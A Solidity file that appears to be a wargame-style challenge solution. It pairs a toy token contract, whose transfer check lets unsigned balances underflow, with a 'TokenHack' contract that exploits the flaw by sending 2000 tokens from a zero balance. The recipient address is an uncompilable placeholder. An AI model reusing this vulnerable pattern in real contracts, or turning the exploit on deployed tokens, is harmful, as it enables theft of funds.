// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

contract TokenHack {

  Token public myToken;

  constructor(address TokenAdr) public    {
    myToken = Token(TokenAdr);
  }

  function transfer() public returns (bool) {
    myToken.transfer(0x..., 2000);
  }

  function balanceOf() public view returns (uint balance) {
    return myToken.balanceOf(msg.sender);
  }
}